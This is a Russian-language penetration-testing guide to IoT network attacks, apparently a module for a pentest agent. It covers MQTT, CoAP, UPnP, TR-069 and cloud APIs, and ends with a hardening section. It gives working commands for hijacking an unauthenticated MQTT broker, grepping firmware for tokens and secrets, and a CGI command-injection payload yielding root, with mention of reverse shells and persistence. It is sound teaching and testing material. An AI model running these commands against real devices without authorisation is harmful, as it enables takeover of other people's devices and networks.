IoT-устройство — это не только железо, но и сетевой узел. После того как вы разобрали прошивку и/или получили доступ к устройству, следующий слой — сетевые протоколы и облако. Здесь часто встречаются отсутствие аутентификации, слабая криптография и доверие к данным из сети — то, что даёт удалённую компрометацию всего парка устройств.

## Теория: стек IoT

IoT-устройство — это маленький компьютер с урезанной ОС (часто BusyBox Linux), набором сетевых сервисов и связью с облаком вендора. Атака идёт по слоям:

- **Физический/радио** — UART, JTAG, SPI, sub-GHz, BLE (см. `hardware-rf`, `hardware-jtag`).
- **Локальная сеть** — веб-интерфейс, Telnet/SSH, MQTT, UPnP/SSDP, mDNS, RTSP.
- **WAN/облако** — TR-069, HTTPS-API вендора, MQTT-брокер облака.
- **Мобильное приложение** — тот же API, часто с хардкод-секретами.

Типовые протоколы и поверхности IoT:

| Протокол / слой | Порт | Типовые проблемы |
|-----------------|------|------------------|
| HTTP/HTTPS веб-интерфейс | 80/443 | command injection в CGI, слабая авторизация, default creds |
| **MQTT** | 1883/8883 | брокер без аутентификации, топики `#`, подписка на команды |
| **CoAP** | 5683/5684 | UDP, нет авторизации, amplification |
| **UPnP / SSDP** | 1900/5000 | IGD-эксплуатация, открытие портов, SOAP injection |
| **TR-069 (CWMP)** | 7547 | RCE через ACS, слабая аутентификация |
| Telnet/SSH | 23/22 | default creds, слабые пароли |
| RTSP (камеры) | 554 | отсутствие auth, path traversal |
| mDNS/SSDP | 5353/1900 | утечка модели, версии, имён |
| Облачный API | 443 | IDOR, отсутствие rate-limit, токены в прошивке |
| Мобильное приложение | — | те же API, хардкод-секреты, BLE |

**MQTT** — лёгкий publish/subscribe брокер, любимый IoT. Если он без аутентификации и разрешает wildcard-подписку (`#`), вы читаете все сообщения устройства и можете публиковать команды в топик управления. Это одна из самых частых и самых «урожайных» находок.

**TR-069** — протокол удалённого управления от провайдера; исторически содержал RCE (например, CVE-2014-9222 «Misfortune Cookie», CVE-2016-10372). Часто открыт на WAN-порту, что делает его критичным.

**UPnP/SSDP** — устройство может открывать порты на роутере по запросу, что позволяет пробить NAT. Также IGD-реализации содержали RCE.

**CoAP** — UDP-протокол «REST для сенсоров»; часто без DTLS и с предсказуемыми ресурсами (`/config`, `/actuator`).

## Инструменты и команды

- **nmap** — обнаружение сервисов и версий, NSE-скрипты под IoT.
- **mqtt-pwn / mosquitto clients** — работа с MQTT.
- **Wireshark / tshark** — разбор протоколов (MQTT, CoAP, TR-069, UPnP).
- **mitmproxy** — перехват облачного трафика (если есть сертификат).
- **upnpc / Miranda** — UPnP.
- **firmware secrets** — токены и URL API из прошивки.
- **Firmwalker / strings** — вытащить эндпоинты и креды из образа.

```bash
# Полное сканирование устройства
nmap -sV -sC -p- 192.168.1.1 -oX device.xml
nmap --script broadcast-igmp-discovery,broadcast-listener 192.168.1.0/24

# SSDP-обнаружение
nmap -sU -p1900 --script=upnp-info 192.168.1.1

# MQTT: подписка на всё
mosquitto_sub -h 192.168.1.50 -p 1883 -t '#' -v
# Публикация команды в управляющий топик
mosquitto_pub -h 192.168.1.50 -t 'home/livingroom/light' -m '{"on":true}'

# TR-069
nmap -p7547 -sV 192.168.1.1

# CoAP (нужен aiocoap / coap-client)
coap-client -m get coap://192.168.1.50/.well-known/core
```

Полезные NSE-скрипты: `upnp-info`, `mqtt-subscribe`, `coap-resources`, `broadcast-*`. Для быстрого «что тут живёт» — `nmap -sU -sV -p 1900,5353,5683 <host>`.

## Разведка: обнаружение и инвентаризация

Порядок разведки устройства:

1. **Полный TCP-скан** `-p-` — IoT прячет сервисы на 8080, 9999, 7547, 49152.
2. **UDP-скан** популярных портов (1900, 5353, 5683, 161) — многие протоколы UDP-only.
3. **Баннеры и заголовки** — `curl -sI http://<host>/`, `nc <host> 23`.
4. **mDNS/SSDP** — часто отдают модель и версию без аутентификации.
5. **Разбор прошивки** — grep по URL/токенам, чтобы понять облачный контур.

## Разобранный пример: MQTT без аутентификации и захват управления

**Дано:** умные лампы с MQTT-брокером `192.168.1.50`.

**Шаг 1 — обнаружение:**
```bash
nmap -sV -p1883,8883 192.168.1.50
# 1883/tcp open  mqtt   Mosquitto
```

**Шаг 2 — попытка анонимного доступа:**
```bash
mosquitto_sub -h 192.168.1.50 -t '#' -v
```
Если брокер без auth, вы сразу видите поток сообщений:
```text
devices/lamp01/status {"on":false,"brightness":50}
devices/lamp01/telemetry {"power":3.2}
```

**Шаг 3 — поиск управляющего топика.** Из подписки и из прошивки (grep по строкам MQTT) находим топик команд:
```bash
mosquitto_pub -h 192.168.1.50 -t 'devices/lamp01/cmd' -m '{"on":true}'
```
Лампа включается — подтверждена полная компрометация без пароля.

**Шаг 4 — масштабирование.** Wildcard `#` показывает топики всех устройств. Одно правило на брокере — и вся инсталляция под контролем. Это критично для оценки impact: одна точка (брокер) управляет парком.

**Шаг 5 — облачный API.** В прошивке ищем URL облака и токены:
```bash
grep -rE "https?://[a-z0-9.-]+" squashfs-root/ | grep -vi "schemas\|w3.org" | head
grep -rEi "api[_-]?key|token|secret" squashfs-root/ | head
```
Найденный токен проверяем на IDOR: меняем device_id в запросе — если отдаёт чужое устройство, это BOLA.

**Шаг 6 — UPnP.** Проверяем, открывает ли устройство порты:
```bash
upnpc -l
nmap --script upnp-info -p1900 192.168.1.1
```

**Шаг 7 — TR-069.** Если 7547 открыт наружу — проверяем ACS-аутентификацию и известные RCE по версии.

## Разобранный пример: command injection в CGI роутера

Типовой класс для роутеров — веб-интерфейс вызывает shell-утилиты с параметрами пользователя.

```bash
# Проверка диагностического ping/traceroute
curl -s "http://192.168.1.1/cgi-bin/diag.cgi?host=127.0.0.1;id"
# uid=0(root) gid=0(root) — RCE
```
Дальше — обратный шелл и персистентность, но помните: у устройства мало ресурсов, и агрессивные действия могут его «уронить». Сначала одна команда, затем стабилизация канала (см. `hardware-firmware-emulation` про отладку сервисов).

## Частые ошибки

- **Скан только популярных портов.** IoT-сервисы живут на нестандартных портах (8080, 9999, 7547, 49152). Сканируйте `-p-`.
- **Забыли про UDP.** CoAP (5683), SSDP (1900), mDNS (5353) — UDP. `nmap` без `-sU` их не видит.
- **Игнорирование облака.** Даже если устройство локально защищено, облачный API может быть дырявым.
- **Брутфорс по MQTT/вебу без лимита.** Устройства слабые и падают. Сначала пробуйте анонимный доступ и default creds, не лейте словари.
- **Забыли про мобильное приложение.** Оно общается с тем же API и часто содержит ключи и скрытые эндпоинты.
- **Эксплуатация без согласия.** Атака IoT в проде провайдера/чужой сети — вне закона. Только в рамках авторизованного теста/CTF.
- **Потеря устройства после «тяжёлой» команды.** Не ставьте `reboot`, `flash`, `nvram commit` без нужды — рискуете «окирпичить» цель.

## Защита и hardening IoT

Понимание атак важно и с оборонительной стороны. Что реально закрывает поверхность IoT:

- **MQTT:** включить аутентификацию (пароль/сертификат), ACL по топикам, запретить wildcard-подписку для клиентов, TLS (8883). Никогда не выставлять 1883 в интернет.
- **Веб-интерфейс:** убрать default creds, ограничить доступ по LAN, обновлять прошивку, не запускать CGI от root.
- **TR-069:** не публиковать 7547 наружу, использовать только с ACS провайдера, строгая аутентификация CWMP.
- **UPnP:** отключать, если не нужен; IGD должен требовать подтверждения.
- **CoAP:** использовать DTLS (5684), не оставлять открытые ресурсы управления.
- **Облако:** токены на устройство (не общие), rate-limit, проверка владельца объекта на сервере (защита от BOLA).
- **Сегментация:** IoT в отдельный VLAN, без доступа к корпоративной сети.
- **Мониторинг:** аномалии в трафике MQTT/облака — ранний признак компрометации.

Практический вывод для пентеста: каждая находка должна сопровождаться конкретной рекомендацией, а не общим «обновите прошивку». Оценка impact строится на числе устройств за одной точкой отказа (брокер, ACS, облачный API) — это то, что делает IoT-уязвимость критичной.

## Что дальше / решение

- **Нашли MQTT без auth** → зафиксируйте impact (число устройств, какие команды) и добавьте рекомендацию «аутентификация + ACL по топикам».
- **Нашли облачный токен** → проверьте BOLA/IDOR, эскалацию на чужие аккаунты, rate-limit.
- **Нашли command injection** → получите PoC одной командой, затем оцените RCE-риск и персистентность.
- **Ничего не открыто** → вернитесь к прошивке (`hardware-firmware-extract`) и `hardware-firmware-emulation`, ищите скрытые эндпоинты и пароли.
- **Провалились все сетевые векторы** → `record_vector attempted` и переходите к радио/аппаратным интерфейсам.
